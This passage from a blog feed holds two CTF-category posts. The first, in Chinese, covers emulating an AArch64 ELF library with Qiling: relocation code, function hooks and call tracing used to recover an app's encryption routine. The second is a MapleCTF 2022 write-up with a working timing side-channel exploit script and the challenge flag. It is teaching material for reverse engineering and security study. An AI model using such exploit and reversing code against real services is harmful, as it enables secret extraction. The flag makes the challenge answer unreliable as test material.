<p>我们主要关注以下几个<code>d_tag</code></p>
<p><code>DT_STRTAB</code>&#x2F;<code>DT_STRSZ</code>: 字符串表的地址和长度。运行时链接程序所需的符号名称、依赖项名称和其他字符串位于该表中。</p>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/Screenshot_20240710_105120.png"></p>
<p><code>DT_SYMTAB</code>: 符号表的地址。</p>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/Screenshot_20240710_105454.png"></p>
<p>64位下符号表可以用如下结构表示，我们主要关注<code>st_name</code>和<code>st_value</code>。</p>
<p><code>st_name</code>表示该符号在字符串表的索引，可以通过这个值和字符串表拿到该符号的字符串名称，如果<code>st_name</code>的值为0，则代表该符号没有相对于的字符串名称。</p>
<p><code>st_info</code>代表该符号的值。根据上下文，该值可以是绝对值或地址（和之后的重定向的类型相关）。 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Word      st_name;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   st_info;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   st_other;</span><br><span class="line">    Elf64_Half      st_shndx;</span><br><span class="line">    Elf64_Addr      st_value;</span><br><span class="line">    Elf64_Xword     st_size;</span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>

<p><code>DT_RELA</code>&#x2F;<code>DT_REL</code>: 重定位表的地址。一个二进制文件里可以有多个重定位节。为可执行文件或共享目标文件创建重定位表时，链接编辑器会连接这些节以形成一个表。在64位下，ELF有两种重定位表的结构 REL and RELA，分别对于DT_REL和DT_RELA</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  Elf64_Addr    r_offset;   <span class="comment">// Address</span></span><br><span class="line">  Elf64_Xword   r_info;	    <span class="comment">// 32-bit relocation type; 32-bit symbol index</span></span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  Elf64_Addr    r_offset;   <span class="comment">// Address</span></span><br><span class="line">  Elf64_Xword   r_info;	    <span class="comment">// 32-bit relocation type; 32-bit symbol index</span></span><br><span class="line">  Elf64_Sxword  r_addend;   <span class="comment">// Addend</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>

<p><code>r_offset</code>代表需要修复的虚拟地址</p>
<p><code>r_info</code>存放了<code>r_info_sym</code>和<code>r_info_type</code>的值，其中<code>r_info_sym</code>表示该重定向指向了符号表中的第<em>N</em>项，<code>r_info_type</code>代表了重定向的类型，对于不同的架构，重定向类型也有不同，具体可以参考官方的ABI。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">r_info_sym = r_info &gt;&gt; <span class="number">8</span></span><br><span class="line">r_info_type = r_info &amp;&amp; <span class="number">0xff</span></span><br></pre></td></tr></table></figure>

<p>开始重定向时，我们首先读取所有的重定位表，然后根据<code>r_info_sym</code>和符号表找到每一个重定位项对应的符号，最后根据符号表中的<code>st_value</code>，重定位表中的<code>r_info_type</code>, <code>r_addend</code>以及当前程序的base address计算出重定向之后的地址并写入内存中即可。</p>
<h3 id="AArch64下的重定位"><a href="#AArch64下的重定位" class="headerlink" title="AArch64下的重定位"></a>AArch64下的重定位</h3><p>因为我们的测试用二进制是aarch64的，那我们这里就用aarch64作为例子来说明重定向的过程。</p>
<p>首先我们需要知道不同的重定向类别即<code>r_info_type</code>是如何计算重定向值的，具体的计算方法我们可以参考arm官方的ABI <a href="#Reference">6</a>。在这里呢，我们来看一下比较常用的几个重定向类别。</p>
<p><code>R_AARCH64_ABS64</code>: 符号地址+<code>r_addend</code> 即 程序基值 + <code>st_value</code> + <code>r_addened</code></p>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/Screenshot_20240710_124250.png"></p>
<p><code>R_AARCH64_GLOB_DAT</code>: 也是符号地址 + <code>r_addend </code>也是 程序基值 + <code>st_value</code> + <code>r_addened</code></p>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/Screenshot_20240710_124526.png"></p>
<p><code>R_AARCH64_RELATIVE</code>: 程序基值加上 +  <code>r_addend</code></p>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/Screenshot_20240710_124757.png"></p>
<p><code>R_AARCH64_JUMP_SLOT</code>: 这个比较特殊，代表了跳转表。这个类别一般和调用外部库时有关。当<code>st_value</code>的值为0的时候，说明这个符号是外部导入的，需要通过连接器从加载的库中找到并加载。当然，这个重定向也可以在运行时再链接，即在需要这个符号的时候进行懒加载，关于这段可以在搜索并参考**__dl_runtime_resolve()**的过程</p>
<p>如果<code>st_value</code>的值不为0，则和<code>R_AARCH64_GLOB_DAT</code>一样，都是符号地址+<code>r_addend</code></p>
<p>手动实现重定向代码的例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_symbol_table</span>(<span class="params">elf: <span class="string">&#x27;ELF&#x27;</span></span>) -&gt; SymbolTableSection:</span><br><span class="line">    <span class="keyword">for</span> section <span class="keyword">in</span> elf.iter_sections():</span><br><span class="line">        <span class="keyword">if</span> section.header.sh_type == <span class="string">&quot;SHT_DYNSYM&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> section</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_relocations</span>(<span class="params">elf: <span class="string">&#x27;ELF&#x27;</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">int</span>, Relocation]:</span><br><span class="line">    rel_sections: <span class="type">List</span>[RelocationSection] = []</span><br><span class="line">    <span class="keyword">for</span> section <span class="keyword">in</span> elf.iter_sections():</span><br><span class="line">        <span class="keyword">if</span> section.header.sh_type <span class="keyword">in</span> [<span class="string">&quot;SHT_REL&quot;</span>, <span class="string">&quot;SHT_RELA&quot;</span>]:</span><br><span class="line">            rel_sections.append(section)</span><br><span class="line">        <span class="keyword">if</span> section.header.sh_type == <span class="string">&quot;SHT_DYNSYM&quot;</span>:</span><br><span class="line">            dynsym = section</span><br><span class="line"></span><br><span class="line">    relocs = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="comment"># https://static1.squarespace.com/static/59c4375b8a02c798d1cce06f/t/59d55a7bf5e2319471bb94a4/1507154557709/ELF+for+ARM64.pdf</span></span><br><span class="line">    <span class="keyword">for</span> rel_section <span class="keyword">in</span> rel_sections:</span><br><span class="line">        <span class="keyword">for</span> reloc <span class="keyword">in</span> rel_section.iter_relocations():</span><br><span class="line">            r_offset = reloc.entry.r_offset  <span class="comment"># 表示 .text[r_offset]处需要进行修复</span></span><br><span class="line">            <span class="keyword">if</span> r_offset <span class="keyword">in</span> relocs:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">&quot;wtf&quot;</span>)</span><br><span class="line">            relocs[r_offset] = reloc</span><br><span class="line">            <span class="comment"># print(reloc.entry.r_info_sym)</span></span><br><span class="line">            <span class="comment"># r_info = reloc.entry.r_info  # 用来存放 r_info_sym 和 r_info_type</span></span><br><span class="line">            <span class="comment"># r_info_sym = reloc.entry.r_info_sym  # 表示该重定向为符号表中的第 N 项</span></span><br><span class="line">            <span class="comment"># r_info_type = reloc.entry.r_info_type  # 表示该重定向的类型，对应枚举值 ENUM_RELOC_TYPE_ARM</span></span><br><span class="line">            <span class="comment"># r_addend = reloc.entry.r_addend</span></span><br><span class="line">            <span class="comment"># print(f&quot;&#123;rel_section.name&#125; fixing &#123;dynsym.get_symbol(r_info_sym).name&#125; at &#123;hex(r_offset)&#125; to &#123;hex(dynsym.get_symbol(r_info_sym).entry.st_value)&#125; with type &#123;hex(r_info_type)&#125; added &#123;hex(r_addend)&#125;&quot;, )</span></span><br><span class="line">            <span class="comment"># # print(dynsym.get_symbol(r_info_sym).name,dynsym.get_symbol(r_info_sym).entry)</span></span><br><span class="line">    <span class="keyword">return</span> relocs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fix relocation</span></span><br><span class="line">relocs = get_relocations(lib)</span><br><span class="line">symtab = get_symbol_table(lib)</span><br><span class="line"><span class="keyword">for</span> addr, reloc <span class="keyword">in</span> relocs.items():</span><br><span class="line">    <span class="comment"># 0x4962a0</span></span><br><span class="line">    <span class="comment"># https://static1.squarespace.com/static/59c4375b8a02c798d1cce06f/t/59d55a7bf5e2319471bb94a4/1507154557709/ELF+for+ARM64.pdf</span></span><br><span class="line">    <span class="keyword">if</span> reloc.entry.r_info_type == ENUM_RELOC_TYPE_AARCH64[<span class="string">&#x27;R_AARCH64_JUMP_SLOT&#x27;</span>]:</span><br><span class="line">        name = symtab.get_symbol(relocs[addr].entry.r_info_sym).name</span><br><span class="line">        <span class="comment"># need to import from external library</span></span><br><span class="line">        <span class="keyword">if</span> symtab.get_symbol(relocs[addr].entry.r_info_sym).entry.st_value == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(name, <span class="built_in">hex</span>(addr), symtab.get_symbol(relocs[addr].entry.r_info_sym).entry.st_value,</span><br><span class="line">                  relocs[addr].entry.r_addend)</span><br><span class="line">    <span class="keyword">if</span> reloc.entry.r_info_type <span class="keyword">in</span> [</span><br><span class="line">        ENUM_RELOC_TYPE_AARCH64[<span class="string">&#x27;R_AARCH64_ABS64&#x27;</span>],</span><br><span class="line">        ENUM_RELOC_TYPE_AARCH64[<span class="string">&#x27;R_AARCH64_GLOB_DAT&#x27;</span>],</span><br><span class="line">        ENUM_RELOC_TYPE_AARCH64[<span class="string">&#x27;R_AARCH64_JUMP_SLOT&#x27;</span>]]:</span><br><span class="line">        ql.mem.write(lib.address + addr,</span><br><span class="line">                     (lib.address + symtab.get_symbol(relocs[addr].entry.r_info_sym).entry.st_value + relocs[</span><br><span class="line">                         addr].entry.r_addend).to_bytes(<span class="number">8</span>,</span><br><span class="line">                                                        <span class="string">&quot;little&quot;</span>))</span><br><span class="line">    <span class="keyword">elif</span> reloc.entry.r_info_type <span class="keyword">in</span> [ENUM_RELOC_TYPE_AARCH64[<span class="string">&#x27;R_AARCH64_RELATIVE&#x27;</span>]]:</span><br><span class="line">        ql.mem.write(lib.address + addr,</span><br><span class="line">                     (lib.address + relocs[addr].entry.r_addend).to_bytes(<span class="number">8</span>, <span class="string">&quot;little&quot;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;not handled r_info_type <span class="subst">&#123;reloc.entry.r_info_type&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># exit(0)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>当完成重定位之后，我们就可以把pc指向我们想要开始运行的地方，接着就可以开始执行代码了</p>
<h1 id="用Qiling来模拟运行"><a href="#用Qiling来模拟运行" class="headerlink" title="用Qiling来模拟运行"></a>用Qiling来模拟运行</h1><p>在完成重定向之后，我们就可以来开始执行代码了。在这里，我使用了qiling框架来模拟运行aarch64下的代码。</p>
<p>简单来说，qiling框架就是unicorn加上更高级别的模拟功能。不仅支持处理器仿真，还能够模拟操作系统的行为。这意味着我们可以在模拟器中运行完整的用户态程序，而不仅仅是单个指令或小段代码。qiling还支持文件系统、网络等外围设备的模拟，比较适合整体模拟运行整个程序。</p>
<h2 id="导入函数的实现"><a href="#导入函数的实现" class="headerlink" title="导入函数的实现"></a>导入函数的实现</h2><p>在使用上面所讲的重定位方法重定位好二进制后，我们还需要处理外部导入的函数。这边我们可以有两种办法，一种是把依赖库也加载的内存里，然后寻找对应的导出函数并把地址写回。或者我们也可以用hook的形式在python里手动实现需要导入的函数。</p>
<p>比如，<code>libkpk.so</code>需要使用<code>strlen</code>这个函数，那我们就可以hook<code>strlen</code>的地址并实现strlen的功能，这样就不需要寻找对于的依赖库了，而且还可以追踪函数调用的参数和结果。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_strlen</span>(<span class="params">ql: Qiling</span>):</span><br><span class="line">    <span class="comment"># The string address is in X0 for AArch64</span></span><br><span class="line">    string_address = ql.arch.regs.read(arm64_const.UC_ARM64_REG_X0)</span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        byte = ql.mem.read(string_address + length, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> byte[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        length += <span class="number">1</span></span><br><span class="line">    stlogger.log(<span class="string">f&quot;strlen called with <span class="subst">&#123;ql.mem.read(string_address, length)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># Write the result back to X0</span></span><br><span class="line">    ql.arch.regs.write(arm64_const.UC_ARM64_REG_X0, length)</span><br><span class="line">    stlogger.callstack.pop(-<span class="number">1</span>)</span><br><span class="line">    ql.arch.regs.write(arm64_const.UC_ARM64_REG_PC, ql.arch.regs.read(arm64_const.UC_ARM64_REG_LR))</span><br><span class="line"></span><br><span class="line">ql.hook_address(hook_strlen, base_address + <span class="number">0x0013b970</span>)</span><br></pre></td></tr></table></figure>

<h2 id="函数调用追踪"><a href="#函数调用追踪" class="headerlink" title="函数调用追踪"></a>函数调用追踪</h2><p>借助qiling的hook，我们同样可以实现对每个函数的调用追踪，并打印出函数的call stack</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StackTracerLogger</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,</span></span><br><span class="line"><span class="params">                 addr_to_fname,</span></span><br><span class="line"><span class="params">                 base_address=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">                 print_func_with_symbol_only=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">                 print_exit=<span class="literal">True</span>,</span></span><br><span class="line"><span class="params">                 printer=<span class="built_in">print</span></span></span><br><span class="line"><span class="params">                 </span>):</span><br><span class="line">        <span class="variable language_">self</span>.addr_to_fname = addr_to_fname</span><br><span class="line">        <span class="variable language_">self</span>.base_address = base_address</span><br><span class="line">        <span class="variable language_">self</span>.printer = printer</span><br><span class="line">        <span class="variable language_">self</span>.print_func_with_symbol_only = print_func_with_symbol_only</span><br><span class="line">        <span class="variable language_">self</span>.print_exit = print_exit</span><br><span class="line">        <span class="variable language_">self</span>.callstack = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">self, func_addr: <span class="built_in">int</span>, call_from: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.callstack.append(func_addr)</span><br><span class="line">        fname = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> func_addr <span class="keyword">in</span> <span class="variable language_">self</span>.addr_to_fname:</span><br><span class="line">            fname = <span class="variable language_">self</span>.addr_to_fname[func_addr]</span><br><span class="line">        <span class="keyword">if</span> fname == <span class="string">&quot;&quot;</span> <span class="keyword">and</span> <span class="variable language_">self</span>.print_func_with_symbol_only:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">elif</span> fname == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            fname = <span class="string">f&quot;func_<span class="subst">&#123;<span class="built_in">hex</span>(func_addr - base_address)&#125;</span>&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.printer(</span><br><span class="line">            <span class="string">f&quot;[<span class="subst">&#123;<span class="built_in">len</span>(self.callstack)&#125;</span>]<span class="subst">&#123;<span class="string">&#x27; &#x27;</span> * <span class="built_in">len</span>(self.callstack)&#125;</span>calls <span class="subst">&#123;fname&#125;</span> from <span class="subst">&#123;<span class="built_in">hex</span>(call_from - self.base_address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exit</span>(<span class="params">self, exit_addr</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.print_exit:</span><br><span class="line">            <span class="variable language_">self</span>.printer(<span class="string">f&quot;[<span class="subst">&#123;<span class="built_in">len</span>(self.callstack)&#125;</span>]<span class="subst">&#123;<span class="string">&#x27; &#x27;</span> * <span class="built_in">len</span>(self.callstack)&#125;</span>exit at <span class="subst">&#123;<span class="built_in">hex</span>(exit_addr - base_address)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.callstack:</span><br><span class="line">            <span class="variable language_">self</span>.callstack.pop(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="variable language_">self</span>.printer(<span class="string">f&quot;[<span class="subst">&#123;<span class="built_in">len</span>(self.callstack)&#125;</span>]<span class="subst">&#123;<span class="string">&#x27; &#x27;</span> * (<span class="built_in">len</span>(self.callstack) + <span class="number">1</span>)&#125;</span><span class="subst">&#123;msg&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">select_qiling_backtrace</span>(<span class="params">self, arch_type: QL_ARCH</span>):</span><br><span class="line">        <span class="keyword">if</span> arch_type == QL_ARCH.ARM64:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.ql_aarch64_backtrace</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ql_aarch64_backtrace</span>(<span class="params">self, ql: Qiling, address, size</span>):</span><br><span class="line">        <span class="comment"># Read the code at the current address</span></span><br><span class="line">        code = ql.mem.read(address, size)</span><br><span class="line">        <span class="comment"># Decode the instruction (simple detection based on opcode; consider using Capstone for complex cases)</span></span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            opcode = <span class="built_in">int</span>.from_bytes(code, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">            <span class="comment"># Detect BL or BLX (0x94000000 for BL, check mask for lower bits)</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">int</span>.from_bytes(code, <span class="string">&#x27;little&#x27;</span>) &amp; <span class="number">0xFC000000</span>) == <span class="number">0x94000000</span>:</span><br><span class="line">                <span class="comment"># Calculate target address (offset is 26 bits, shift left and sign extend)</span></span><br><span class="line">                offset = <span class="built_in">int</span>.from_bytes(code, <span class="string">&#x27;little&#x27;</span>) &amp; <span class="number">0x03FFFFFF</span></span><br><span class="line">                <span class="keyword">if</span> offset &amp; <span class="number">0x02000000</span>:  <span class="comment"># Sign bit of 26-bit offset</span></span><br><span class="line">                    offset -= <span class="number">0x04000000</span>  <span class="comment"># 2&#x27;s complement negative offset</span></span><br><span class="line">                target = address + (offset &lt;&lt; <span class="number">2</span>)  <span class="comment"># left shift to account for instruction size</span></span><br><span class="line">                <span class="variable language_">self</span>.call(target, address)</span><br><span class="line">            <span class="comment"># blr</span></span><br><span class="line">            <span class="keyword">elif</span> (opcode &amp; <span class="number">0xFFFFFC1F</span>) == <span class="number">0xD63F0000</span>:</span><br><span class="line">                reg_num = (opcode &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span></span><br><span class="line">                reg_val = ql.arch.regs.read(reg_num)</span><br><span class="line">                <span class="variable language_">self</span>.call(reg_val, address)</span><br><span class="line">            <span class="keyword">elif</span> opcode == <span class="number">0xd65f03c0</span>:  <span class="comment"># RET</span></span><br><span class="line">                <span class="variable language_">self</span>.exit(address)</span><br><span class="line"></span><br><span class="line">addr_to_fname = <span class="built_in">dict</span>((v, k) <span class="keyword">for</span> k, v <span class="keyword">in</span> lib.symbols.items())</span><br><span class="line">stlogger = StackTracerLogger(</span><br><span class="line">    addr_to_fname, lib.address, print_func_with_symbol_only=<span class="literal">True</span>, print_exit=<span class="literal">False</span>,</span><br><span class="line">    printer=log.info</span><br><span class="line">)</span><br><span class="line">ql.hook_code(stlogger.select_qiling_backtrace(ql.arch.<span class="built_in">type</span>))</span><br></pre></td></tr></table></figure>

<h2 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h2><p>我们可以看见程序完美的运行了起来，并打印出了相对应的call stack</p>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/Screenshot_20240710_133247.png"></p>
<blockquote>
<p>call stack 追踪，发现使用了aec ecb作为加密方法</p>
</blockquote>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/Screenshot_20240710_133429.png"></p>
<blockquote>
<p>成功完成加密，并读取到了加密后的网址</p>
</blockquote>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>通过以上的详细分析和步骤演示，我们成功地在一个不同架构的系统上模拟运行了特定的动态链接库函数。这一过程不仅涉及了对ELF文件格式的深入理解，包括其加载和链接的细节，还包括了使用高级工具如<code>unicorn</code>和<code>qiling</code>进行跨平台模拟。</p>
<p>这种方法的优势在于其能够让我们在不具备目标架构硬件的情况下，进行复杂的二进制文件分析和调试。通过模拟运行，我们能够绕过传统物理设备的限制，更加灵活和深入地探索软件内部的运作机制。</p>
<p>然而，虽然技术上可行并且相当强大，这种方法也要求研究者有较高的技术背景知识，包括对操作系统、编译原理及低级编程的深刻理解。因此，建议有志于深入逆向工程和安全研究领域的朋友们，可以以此作为一个学习的起点，逐步深入研究这些高级技术。</p>
<p>通过实践这样的项目，不仅能够增强对ELF文件结构的理解，还能实际应用在安全分析、漏洞研究等多个领域，帮助我们在未来的安全挑战中占据有利地位。希望本文的内容能为你提供实际的帮助和启发，让你在技术的道路上更进一步。</p>
<p>(结语 - by chatgpt)</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
<li><a href="https://leadroyal.cn/p/968/">Unicorn实战（二）：去掉armariris的字符串加密</a></li>
<li><a href="https://gist.github.com/LeadroyaL/9b0bc6f6a908db1adfc48d85ee43451d">armariris arm32 decode script</a></li>
<li><a href="https://refspecs.linuxfoundation.org/LSB_4.1.0/LSB-Core-S390/LSB-Core-S390/sections.html">ELF special sections</a></li>
<li><a href="https://maskray.me/blog/2021-10-31-relative-relocations-and-relr">Relative relocations and RELR</a>: REL &amp; RELA, basic relocation</li>
<li><a href="https://leadroyal.cn/p/783/">ARM连接时重定位简介（上）</a></li>
<li><a href="https://static1.squarespace.com/static/59c4375b8a02c798d1cce06f/t/59d55a7bf5e2319471bb94a4/1507154557709/ELF+for+ARM64.pdf">ELF for the ARM® 64-bit Architecture (AArch64)</a>: official specification in pdf</li>
<li><a href="https://bbs.kanxue.com/thread-272605.htm">一种新的Android Runtime环境仿真及调试方法</a></li>
<li><a href="http://www.dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">Linux x86 Program Start Up</a></li>
<li><a href="https://www.akkadia.org/drepper/dsohowto.pdf">How To Write Shared Libraries</a></li>
<li><a href="https://he1m4n6a.github.io/2020/07/01/ELF-Loader/">ELF Loader</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1629853">Hack ELF Loader:用户态execve</a></li>
<li><a href="https://docs.oracle.com/cd/E19683-01/816-7777/chapter6-83432/index.html">Program Header Reference</a></li>
<li><a href="https://xz.aliyun.com/t/2254">ELF病毒分析</a></li>
<li><a href="https://www.cnblogs.com/LXP-Never/p/15302534.html">C语言：静态库和动态库 </a></li>
<li><a href="https://lwn.net/Articles/631631/">How programs get run: ELF binaries</a></li>
<li><a href="https://paper.seebug.org/papers/Archive/refs/elf/Understanding_ELF.pdf">ELF 格式解析</a></li>
<li><a href="https://docs.oracle.com/cd/E26926_01/html/E25910/glcfv.html#scrolltoc">ELF 应用程序二进制接口</a></li>
<li><a href="https://github.com/AeonLucid/AndroidNativeEmu">AndroidNativeEmu</a></li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>unicorn</tag>
        <tag>qiling</tag>
        <tag>aarch64</tag>
        <tag>emulation</tag>
        <tag>android</tag>
        <tag>deobfuscation</tag>
      </tags>
  </entry>
  <entry>
    <title>[Crypto] &#39;bit by bit&#39; - an example of timing attack [MapleCTF2022]</title>
    <url>/articles/ctf/maplectf2022-crypto-timing-attack/</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>In maple ctf 2022 (more write up at <a href="/2022/01/28/maple-ctf-2022-write-up/">here</a>), there is a crypto question using <strong>timing attack</strong>, which is a type of <strong>side channel attack</strong>.</p>
<p>timing attack basically is a side channel attack which attacker could attack a crypto system by analyzing the execution time of certain code. </p>
<p>Since every logical operation require time, more complex code takes more time. We can use this property to analyze codes.</p>
<p>For example. the second part takes longer than first part</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add rip, 1</span><br><span class="line"></span><br><span class="line">add rip, 1</span><br><span class="line">add rip, 1</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h1 id="0x1-Server-Code"><a href="#0x1-Server-Code" class="headerlink" title="0x1 Server Code"></a>0x1 Server Code</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from hashlib import sha256</span><br><span class="line">from os import urandom</span><br><span class="line">import scrypt</span><br><span class="line"></span><br><span class="line">flag = b&quot;fakeflag&quot;</span><br><span class="line"></span><br><span class="line"># Convert the flag (in bytes) to bits</span><br><span class="line">bits = &#x27;&#x27;.join([bin(c)[2:].zfill(8) for c in flag])</span><br><span class="line">print(bits)</span><br><span class="line"># Return an encrypted string based on the bit at a certain index</span><br><span class="line">def encrypt(index):</span><br><span class="line">	assert(0 &lt;= index &lt; len(bits))</span><br><span class="line"></span><br><span class="line">	# Generate a random salt for the given index</span><br><span class="line">	salt = urandom(32)</span><br><span class="line">	# Depending on the bit value, hash the flag differently</span><br><span class="line">	if bits[index] == &#x27;0&#x27;:</span><br><span class="line">		encrypted = scrypt.hash(flag, salt, 2 ** 16).hex()</span><br><span class="line">	else:</span><br><span class="line">		encrypted = sha256(flag + salt).hexdigest()</span><br><span class="line">	return encrypted[:32]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	while True:</span><br><span class="line">		try:</span><br><span class="line">			print(&quot;Which bit would you like to query for?&quot;)</span><br><span class="line">			bit_index = int(input(&quot;&gt;&gt;&gt; &quot;))</span><br><span class="line">			print(encrypt(bit_index))</span><br><span class="line">		except Exception:</span><br><span class="line">			print(&quot;Something unexpected happened, please try again!&quot;)</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Analysis"><a href="#0x2-Analysis" class="headerlink" title="0x2 Analysis"></a>0x2 Analysis</h1><p>firstly, lets take look at how code works.</p>
<ul>
<li>pad each character in the 8 bit string</li>
<li>get the bit given an index, encrypt flag using either sha256 or scrypt depending on the bit</li>
<li>return the first 32 value of encrypted flag</li>
</ul>
<p>looks like we don&#39;t have any possible way of getting the flag. </p>
<p>However, since <code>scrypt</code> runs much slower than <code>sha256</code>, we can measure the time of encrypting flag. And then use time to figure out if the bit is 1 or 0.</p>
<p>if we measure the time, we can see scrypt is using 0.16705632209777832 seconds, while sha256 only using 0.0001506805419921875, which is 1000 times slower.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Which bit would you like to query for?</span><br><span class="line">&gt;&gt;&gt; 0</span><br><span class="line">0 0.16705632209777832 128</span><br><span class="line">69adfaef506c83899a98cc3f670a0e5d</span><br><span class="line">Which bit would you like to query for?</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">1 0.0001506805419921875 64</span><br><span class="line">3dc8c8cfae15c453bc162cafecc27575</span><br><span class="line">Which bit would you like to query for?</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>

<h1 id="0x3-exploit-py"><a href="#0x3-exploit-py" class="headerlink" title="0x3 exploit.py"></a>0x3 exploit.py</h1><p>here is my solution</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bits_time = []</span><br><span class="line">io = connect(host, port)</span><br><span class="line">index = 0</span><br><span class="line">while True:</span><br><span class="line">    print(index)</span><br><span class="line">    io.sendlineafter(b&quot;&gt;&gt;&gt; &quot;, b&quot;%d&quot;%index)</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    h = io.recvuntil(b&#x27;\n&#x27;)</span><br><span class="line">    t2 = time.time()</span><br><span class="line">    bits_time.append(t2-t1)</span><br><span class="line">    if h.startswith(b&quot;Something unexpected happened&quot;):</span><br><span class="line">        break</span><br><span class="line">    index +=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(bits_time)</span><br><span class="line">real_bits = []</span><br><span class="line">for bt in bits_time:</span><br><span class="line">    if bt &gt;= 0.1:</span><br><span class="line">        real_bits.append(&quot;0&quot;)</span><br><span class="line">    else:</span><br><span class="line">        real_bits.append(&quot;1&quot;)</span><br><span class="line">print(real_bits)</span><br><span class="line"></span><br><span class="line">for i in range(0,len(real_bits),8):</span><br><span class="line">    print(chr(int(&quot;&quot;.join(real_bits[i:i+8]),2)),end=&quot;&quot;)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure>

<h1 id="0x4-flag"><a href="#0x4-flag" class="headerlink" title="0x4 flag"></a>0x4 flag</h1><p>maple{s!d3_ch@nn3l_a77@ck5}</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>crypto</tag>
        <tag>side channel attack</tag>
      </tags>
  </entry>
  <entry>
